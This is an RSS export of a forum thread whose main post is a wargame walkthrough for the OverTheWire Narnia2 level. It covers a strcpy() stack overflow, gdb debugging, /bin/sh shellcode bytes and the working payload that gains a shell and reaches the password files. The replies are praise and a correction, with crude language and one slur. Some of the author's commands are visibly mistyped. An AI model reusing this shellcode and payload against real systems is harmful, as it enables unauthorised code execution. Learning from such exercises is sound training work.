<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
    <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704</link>
    <description>## Over The Wire: Narnia2 - Smashing the stack.

Ok, so from [narnia0](https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/5) and [narnia1](https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675) we have working shellcode for the narnia servers, and a general understanding of how to smash the stack, irrespectively lol. This time, we are given a real world example (minus ALSR/DEP) of exploiting a program and gaining execution flow to pop a shell and compromise the system. The source code to narnia2.c is as follows: 

&gt;narnia2@melinda:/games/narnia$ cat narnia2.c
&gt;int main(int argc, char * argv[])
{
    char buf[128];

&gt;    if(argc == 1){
        printf(&quot;Usage: %s argument\n&quot;, argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf(&quot;%s&quot;, buf);

&gt;    return 0;
}

Ok, so even if you don&#39;t know any C, this code is extremely basic. First it declares a buffer of 128 characters named **buf**, makes sure the user is only trying to pass it _one_ argument, else exit, and then copy that argument into our variable **buf** using **strcpy()**. Strcpy() is a function in C&#39;s standard library, it copies the contents from one buffer to another buffer, but what is most important to know about strcpy() is that it is one of a handful of functions in C that has no **bounds checking**. What this means is that you can tell it to copy a 512 byte array into a 100 byte buffer, and it won&#39;t have _any_ issues with that whatsoever (until run time of course :joy:). it will just fill up the destination buffer with the first 100 bytes from the source buffer, and then proceed to write 412 bytes from the source buffer right over whatever values are **below** the destination buffer on **the stack**. For this level, we don&#39;t need to know Everything about the stack... but here&#39;s what you need to know.

The stack holds the return address (the last address in memory that code was executing at before it jumped to a new block of memory for a new function), any variables that are passed with the function are actually pushed onto the stack at _at the time the function is called_, and any fixed-length variables within the function are pushed onto the stack at this time. Now, technically what I described above is a single &quot;stack frame&quot;, and _the stack_ in its entirety usually consists of several stack frames at any given point in time as it grows/shrinks in size depending on how many functions deep you are (and how many variables each of those functions use). Conversely, _the heap_ is the section of memory that a program gets allocated to use for variables of an indeterminate size and it starts at the lowest piece of memory the program is allocated and grows up _towards the stack_. Ghettofabulous Fig. 1 demonstrates this as ghetto as possible.

&gt;                           |        ^        |  lower addresses
                          |        |        |
    %esp -stack pointer -&gt;+-----------------+ always points to top of stack
                          |.................|
                          |.local variables.|  accessed with addresses %ebp-# or %esp+#
                          |.................|
    %ebp -frame pointer -&gt;+-----------------+ points to the bottom of a single stack frame, which contains the address to return to, usually also %eip
                          |.................|
                          |.................|  older stack frames
                          |.................|
     bottom of the stack-&gt;+-----------------+ always points at bottom of stack
                          |       v         |  higher addresses v


Values on the stack are usually referenced to by their offset from $EBP, the local Base Pointer, which points to the bottom of a functions stack, aka the current stack frame, _or_ they&#39;re referenced by their offset from $ESP, the Stack Pointer, which always points to the top of the stack. 

The stack grows when we **call a function**, and decreases in size when we **return from a function**.

Confused? Good. Nobody makes the jump their first time. Simply attacking this binary without understanding the stack actually can work though, following some basic steps. So I&#39;ll now switch back into basic bitch mode. Let&#39;s whip out our giant python and slap my bitch up.
&gt;narnia2@melinda:/games/narnia$ pythong -c &#39;print -c &quot;A&quot;*136&#39; | ./narnia2
No command &#39;pythong&#39; found, did you mean:
 Command &#39;python&#39; from package &#39;python-minimal&#39; (main)
pythong: command not found

Fuck, I&#39;ve found this fruedian finger slip one too many times now. Let&#39;s shut it down.
&gt;narnia2@melinda:/games/narnia$ alias pythong=&#39;python&#39;
narnia2@melinda:/games/narnia$ pythong -c &#39;print &quot;A*132&quot;&#39; | ./narnia2
narnia2@melinda:/games/narnia$
narnia2@melinda:/games/narnia$ pythong -c &#39;print &quot;A*136&quot;&#39; | ./narnia2
narnia2@melinda:/games/narnia$
narnia2@melinda:/games/narnia$ pythong -c &#39;print &quot;A*140&quot;&#39; | ./narnia2
Illegal Instruction.
narnia2@melinda:/games/narnia$ pythong -c &#39;print &quot;A*144&quot;&#39; | ./narnia2
Segmentation Fault.

Ok, #gg sauce in and around my mouth. We got a seg fault boyz. Seg faults are the result of a program crashing because it tried to read or write to an inaccessible memory location. If an attacker can somehow **know the location it is trying to access and have code there waiting for it** or **change the address it is trying to access to be the location of your code**, a program can be exploited. 
When we send the program 132 bytes, it over writes the next 4 bytes on the stack, but this does not actually corrupt anything, so the program exits normally. Same with 136 bytes. 140 causes an illegal instruction (explained later or in next tutorial), and 144 smashes the stack to the point of corrupting the return address, causing the program to try to jump to the memory address 0x41414141 when it returns, which is either an illegal address for that program to be accessing, or an address with garbage data at it, and thus the program seg faults... let us take a close look at what is happening in **gdb**, the gnu debugger.

&gt;narnia2@melinda:/games/narnia$ gdb   
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;x86_64-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.
(gdb) file narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) set args $(python -c &#39;print &quot;A&quot;*144&#39;)
(gdb) run
Starting program: /games/narnia/narnia2 $(python -c &#39;print &quot;A&quot;*144&#39;)

&gt;Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) set args $(python -c &#39;print &quot;A&quot;*143&#39;)
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y

&gt;Starting program: /games/narnia/narnia2 $(python -c &#39;print &quot;A&quot;*143&#39;)

&gt;Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()
(gdb) set args $(python -c &#39;print &quot;A&quot;*140 + &quot;BCDE&quot;&#39;)
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y

&gt;Starting program: /games/narnia/narnia2 $(python -c &#39;print &quot;A&quot;*140 + &quot;BCDE&quot;&#39;)

&gt;Program received signal SIGSEGV, Segmentation fault.
0x45444342 in ?? ()

So, we confirmed that after 140 bytes, the next 4 bytes smash the stack and overwrite the saved instruction pointer $EIP (which in this case is also the local base pointer $EBP, since we are at the outer most stack frame, or &quot;stack frame 0&quot;). We confirmed that we can control this value. So now what? 

Now, we want to change that address to be an address that points to a location in memory that _we control_. And what do we control? We control the input to **buf[]**, so lets find out where buff is in memory. (Note: buff may actually me in a couple places in memory... as long as where it&#39;s at is executable memory, it&#39;s fine.)

&gt;(gdb) x/40x $esp-0x14
0xffffd63c:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd64c:    0x45444342    0x00000000    0xffffd6e4    0xffffd6f0
0xffffd65c:    0xf7feacca    0x00000002    0xffffd6e4    0xffffd684
0xffffd66c:    0x08049768    0x0804821c    0xf7fc9000    0x00000000
0xffffd67c:    0x00000000    0x00000000    0xb433f6ed    0x8cea72fd
0xffffd68c:    0x00000000    0x00000000    0x00000000    0x00000002
0xffffd69c:    0x08048360    0x00000000    0xf7ff04c0    0xf7e3b9e9
&gt;(gdb) x/50x $esp-0x100 
0xffffd550:    0xf7fcd2e8    0xf7fcd000    0xffffd574    0x08049758
0xffffd560:    0x0804821c    0x080481bc    0x00000000    0x00000000
0xffffd570:    0x00000000    0xf7e286d4    0xf7e6532b    0xf7fc9000
0xffffd580:    0x00000000    0x00000000    0xffffd648    0xf7e6edff
0xffffd590:    0xf7fc9ac0    0x08048574    0xffffd5b4    0xf7e6edd0
0xffffd5a0:    0xffffd5c0    0xf7ffd938    0xf7fc9000    0x080484bc
0xffffd5b0:    0x08048574    0xffffd5c0    0x00000000    0x00000000
0xffffd5c0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5d0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5e0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5f0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd600:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd610:    0x41414141    0x41414141
(gdb) x/50x $esp-0xdc
0xffffd574:    0xf7e286d4    0xf7e6532b    0xf7fc9000    0x00000000
0xffffd584:    0x00000000    0xffffd648    0xf7e6edff    0xf7fc9ac0
0xffffd594:    0x08048574    0xffffd5b4    0xf7e6edd0    0xffffd5c0
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd634:    0x41414141    0x41414141
(gdb) x/50x $esp-0xcc
0xffffd584:    0x00000000    0xffffd648    0xf7e6edff    0xf7fc9ac0
0xffffd594:    0x08048574    0xffffd5b4    0xf7e6edd0    0xffffd5c0
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd634:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd644:    0x41414141    0x41414141
(gdb) x/50x $esp-0xac
0xffffd5a4:    0xf7ffd938    0xf7fc9000    0x080484bc    0x08048574
0xffffd5b4:    0xffffd5c0    0x00000000    0x00000000    0x41414141
0xffffd5c4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5d4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5e4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5f4:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd604:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd614:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd624:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd634:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffd644:    0x41414141    0x41414141    0x45444342    0x00000000
0xffffd654:    0xffffd6e4    0xffffd6f0    0xf7feacca    0x00000002
0xffffd664:    0xffffd6e4    0xffffd684

Ok, so we can clearly see our buffer of A&#39;s. I went ahead and used **gdb**&#39;s &quot;x&quot; command which **examines** memory at a given register or address. The **&quot;/50x&quot;** after the **&quot;x&quot;** tells **gdb** to print 50 WORDS (or 50 units of this architecture&#39;s default register size, in our case 32 bits = 4 bytes) in **hex**. Doing &quot;x/50s $esp&quot; would print 50 WORDS from $esp and list their values on the right as **string**. While way more readable, I recommend you get used to spotting hex values for your own benefit. The &quot;$esp-0xac&quot; is the address from which I want to examine 50 words. Unfortunately, at this point in our program, the stack has already popped off everything, so it is no longer pointing at 128 bytes + 4 bytes for int argc + 4bytes for char* argv[] + 4 bytes for saved $ebp. It is now pointing way lower at either saved $ebp or $eip, so we need to look at a lower memory address (look higher up if you envision it as a graph that you&#39;re looking at and everything is writing downwards towards higher addresses). Examining the memory, we see that our buffer appears to start around 0xffffd5c0. 
Ok, so now lets imagine what input we&#39;re going to send to narnia2 and what its buffer is going to need to look like:
&gt;i-------------------------------------------------------------------------------------|
&gt; |-- shellcode --|-- garbage data print &quot;A&quot; --|-- address of shellcode --|
&gt;i-------------------------------------------------------------------------------------|

We refer to the entire chunk of data we are sending as our payload. This is our payload, totallying 144 bytes. The last 4 bytes must be the address to the start of our shellcode (which is the start of the buffer), and shellcode + garbage data must be equal to 140 bytes. So garbage data = 140 - shellcode.

Let us get the length of our shellcode. We have our k̶n̶o̶w̶n̶ ̶w̶o̶r̶k̶i̶n̶g̶ (**LOL**) shellcode from narnia1 so we just need to find its length. We&#39;re lazy though and wouldn&#39;t want to terminate our gdb session... in order to execute bash commands within gdb, use **!** at the beginning of the line.

&gt;(gdb) !python -c &#39;print len(&quot;\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43&quot;)&#39;
49
(gdb) set args $(pythong -c &#39;print &quot;\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43&quot; + &quot;A&quot;*91 + &quot;\xc0\xd5\xff\xff&quot;&#39;)
(gdb) run

&gt;Starting program: /games/narnia/narnia2 $(pythong -c &#39;print &quot;\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43&quot; + &quot;A&quot;*91 + &quot;\xc0\xd5\xff\xff&quot;&#39;)
���������������������^1��F[Inferior 1 (process 25969) exited normally] 

Hmmmm... peculiar. It seems to have run, but not popped a shell... This should have worked. Memory is tricky sometimes, maybe it landed in the middle of this shellcode and since the whole thing didn&#39;t get ran it didn&#39;t work... Let&#39;s try putting a nopsled at the front in case we math&#39;d wrong. (Note: lots of my asterixs and shit just disappear so you can&#39;t quite just copy paste this and have to understand what is going on to do it on your own... any questions send me a message or yell at me in IRC)

 &gt;(gdb) set args $(python -c &#39;print &quot;\x90&quot;*51 + &quot;\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43&quot; + &quot;\xc8\xd5\xff\xff&quot;11&#39;)
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y

&gt;Starting program: /bin/dash $(python -c &#39;print &quot;\x90&quot;*51 + &quot;\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43&quot; + &quot;\xc0\xd5\xff\xff&quot;*11&#39;)
Error in re-setting breakpoint 1: No symbol &quot;main&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;main&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;main&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;main&quot; in current context.
/bin/dash: 0: Can&#39;t open ����������������������������������������������������^1��F
[Inferior 1 (process 28745)
 
Hmmmm, so I added a nopsled and it still didn&#39;t work. I added a nopsled and spammed my retrun address 11 times (bytes 100 to 144) to make sure that I wasn&#39;t math&#39;ing that wrong either... Check back here sometime for another installment of why shit works here and not there, where I figure this one out. But for now, lets just grab new shellcode...

And fuck that whole process of looking everywhere for it... let&#39;s just see what other people used in narnia tutorials around the web so I don&#39;t pull my hair out.
Ok, the most used shellcode that works reliably in exploits is:
&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

So lets try that again, shall we?
&gt;(gdb) !python -c &#39;print len(&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;)&#39;
25

140 - 25 = 115 garbage bytes.
&gt;(gdb) set args $(python -c &#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*115 &quot;\xc8\xd5\xff\xff&quot;)
(gdb) run
Breakpoint 1, 0x080484c1 in main ()
(gdb) c
Continuing.
process 27690 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the &quot;file&quot; command.
Error in re-setting breakpoint 1: No symbol &quot;main&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;main&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;main&quot; in current context.
$ ls
narnia0    narnia1    narnia2     narnia3    narnia4    narnia5      narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c    narnia8.c
$whoami
narnia2
$exit
(gdb)

At this point I had inserted a breakpoint earlier to see what was going on (I had previously too but didn&#39;t mention anything). We&#39;ll go wayyyyy more in depth with **gdb** in the future to see just how powerful and useful it can be when debugging. But for now, this is all you need to know. Unfortuntely, our exploit breaks out of narnia2 binary, but gains privileges of the user running gdb, which is narnia2. So we have to do this **outside of gdb** for it to work correctly. Sometimes some things don&#39;t work correctly in **gdb**, as their are certain Op codes reserved for certain tasks in **gdb**... which is highly likely why that shellcode worked in narna1 and then not in narnia2. All that&#39;s left to do is insert our payload into narnia2 and grab the password to narnia3. Science, Bitches. 

&gt;(gdb) quit
narnia2@melinda:/games/narnia$ ./narnia2 $(python -c &#39;print &quot;\x90&quot;*75 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot; + &quot;\xc8\xd5\xff\xff&quot;*11&#39;)
$
$ whoami
narnia3
$ cd /etc/narnia_pass/
$ ls
narnia0  narnia2  narnia4  narnia6  narnia8
narnia1  narnia3  narnia5  narnia7  narnia9
$ cat narnia3</description>
    
    <lastBuildDate>Thu, 07 Jul 2016 16:28:58 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/9</link>
        <pubDate>Sun, 21 Jan 2018 00:43:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-9</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>BRUH. This tutorial is so dope. I loved the addition of comedy, it made me smile all the way through reading this.</p>
<p>When I first saw the code I knew this was going to be a good tutorial. Good old stack buffer overflow. Nice job!</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/8</link>
        <pubDate>Thu, 07 Jul 2016 16:28:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-8</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Good post!</p>
<aside class="quote no-group" data-username="123loaded" data-post="1" data-topic="704">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/123loaded/40/578_2.png" class="avatar"> 123loaded:</div>
<blockquote>
<p>Check back here sometime for another installment of why shit works here and not there, where I figure this one out.</p>
</blockquote>
</aside>
<p>I will keep it hidden so, in case you want to figure it out yourself I do not spoil it <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<div class="spoiler"><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/7">spoiler</a></div>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/7</link>
        <pubDate>Thu, 07 Jul 2016 16:18:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-7</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <p>LoLoLoLoL, you too boo. Happy early bday my nigga. &lt;3</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/6</link>
        <pubDate>Thu, 07 Jul 2016 08:31:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-6</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <p>LoL, yeah you’re absolutely correct. Tbh I didn’t even really look at that piece of code. Glossed right over it and was just kind of commenting on what I thought it was doing lol. Thx for the in-depth analysis though! Glad some peeps are reading these! &lt;3</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/5</link>
        <pubDate>Thu, 07 Jul 2016 08:31:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-5</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Mate, love the series! I love how you describe everything so well. Good job! I’ll be looking forward to your other tuts!</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/4</link>
        <pubDate>Thu, 07 Jul 2016 02:50:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-4</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="123loaded" data-post="1" data-topic="704">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/123loaded/40/578_2.png" class="avatar"> 123loaded:</div>
<blockquote>
<p>makes sure the user is only trying to pass it one argument, else exit</p>
</blockquote>
</aside>
<p><code>argc</code> counts the number of command line arguments <em>including</em> the string of the executable (i.e. <code>arg[0]</code>). The program will exit itself if there are <em>no extra command line arguments</em>.</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/3</link>
        <pubDate>Thu, 07 Jul 2016 02:49:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-3</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[nopSled]]></dc:creator>
        <description><![CDATA[
            <p>missed u famalam i see you’re busy educating! hope to see you soon. very informative tut</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704/2</link>
        <pubDate>Wed, 06 Jul 2016 21:07:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-704-2</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia2-smashing-eip-for-fun-and-free/704.rss">Over The Wire: Narnia2 - Smashing $EIP for fun and free</source>
      </item>
      <item>
        <title>Over The Wire: Narnia2 - Smashing $EIP for fun and free</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <h2>Over The Wire: Narnia2 - Smashing the stack.</h2>
<p>Ok, so from <a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/5">narnia0</a> and <a href="https://0x00sec.org/t/over-the-wire-narnia1-environment-variables-and-shellcode/675">narnia1</a> we have working shellcode for the narnia servers, and a general understanding of how to smash the stack, irrespectively lol. This time, we are given a real world example (minus ALSR/DEP) of exploiting a program and gaining execution flow to pop a shell and compromise the system. The source code to narnia2.c is as follows:</p>
<blockquote>
<p>narnia2@melinda:/games/narnia$ cat narnia2.c<br>
int main(int argc, char * argv[])<br>
{<br>
char buf[128];</p>
</blockquote>
<blockquote>
<p>if(argc == 1){<br>
printf(“Usage: %s argument\n”, argv[0]);<br>
exit(1);<br>
}<br>
strcpy(buf,argv[1]);<br>
printf("%s", buf);</p>
</blockquote>
<blockquote>
<p>return 0;<br>
}</p>
</blockquote>
<p>Ok, so even if you don’t know any C, this code is extremely basic. First it declares a buffer of 128 characters named <strong>buf</strong>, makes sure the user is only trying to pass it <em>one</em> argument, else exit, and then copy that argument into our variable <strong>buf</strong> using <strong>strcpy()</strong>. Strcpy() is a function in C’s standard library, it copies the contents from one buffer to another buffer, but what is most important to know about strcpy() is that it is one of a handful of functions in C that has no <strong>bounds checking</strong>. What this means is that you can tell it to copy a 512 byte array into a 100 byte buffer, and it won’t have <em>any</em> issues with that whatsoever (until run time of course <img src="https://0x00sec.org/images/emoji/twitter/joy.png?v=9" title=":joy:" class="emoji" alt=":joy:">). it will just fill up the destination buffer with the first 100 bytes from the source buffer, and then proceed to write 412 bytes from the source buffer right over whatever values are <strong>below</strong> the destination buffer on <strong>the stack</strong>. For this level, we don’t need to know Everything about the stack… but here’s what you need to know.</p>
<p>The stack holds the return address (the last address in memory that code was executing at before it jumped to a new block of memory for a new function), any variables that are passed with the function are actually pushed onto the stack at <em>at the time the function is called</em>, and any fixed-length variables within the function are pushed onto the stack at this time. Now, technically what I described above is a single “stack frame”, and <em>the stack</em> in its entirety usually consists of several stack frames at any given point in time as it grows/shrinks in size depending on how many functions deep you are (and how many variables each of those functions use). Conversely, <em>the heap</em> is the section of memory that a program gets allocated to use for variables of an indeterminate size and it starts at the lowest piece of memory the program is allocated and grows up <em>towards the stack</em>. Ghettofabulous Fig. 1 demonstrates this as ghetto as possible.</p>
<blockquote>
<pre><code>                      |        ^        |  lower addresses
</code></pre>
</blockquote>
<pre><code>                      |        |        |
%esp -stack pointer -&gt;+-----------------+ always points to top of stack
                      |.................|
                      |.local variables.|  accessed with addresses %ebp-# or %esp+#
                      |.................|
%ebp -frame pointer -&gt;+-----------------+ points to the bottom of a single stack frame, which contains the address to return to, usually also %eip
                      |.................|
                      |.................|  older stack frames
                      |.................|
